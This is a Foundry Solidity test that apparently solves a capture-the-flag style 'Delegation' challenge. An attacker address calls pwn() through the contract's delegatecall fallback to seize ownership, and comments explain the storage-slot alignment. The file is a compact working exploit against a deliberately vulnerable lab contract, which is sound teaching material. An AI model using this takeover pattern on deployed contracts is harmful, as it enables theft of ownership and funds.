// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationTest is Test {
    /*
     * Basically we call 'pwn()' function (Delegate smart contract) on the state variables of Delegation smart contract.
     *  https://rareskills.io/post/delegatecall
     * For a delegatecall attack to successfully modify critical state, the storage layout must align between:
     * 1. the calling contract (Delegation)
     * 2. the delegate contract (Delegate)
     * 3. They do not need the same variable names, but their storage slot ordering must match.
     */
    Delegation public delegationTest;
    Delegate public delegateTest;
    address public attacker = address(0xBEEF);

    function setUp() public {
        delegateTest = new Delegate(address(this));
        delegationTest = new Delegation(address(delegateTest));

        vm.deal(attacker, 1 ether);
    }

    function testDelegationAttack() public {
        vm.startPrank(attacker);
//        Fallback gets triggered as the value is not empty in the 'call' function.
        (bool success,) = address(delegationTest).call(abi.encodeWithSignature("pwn()"));
        require(success);
        assertEq(delegationTest.owner(), attacker);

        vm.stopPrank();
    }

}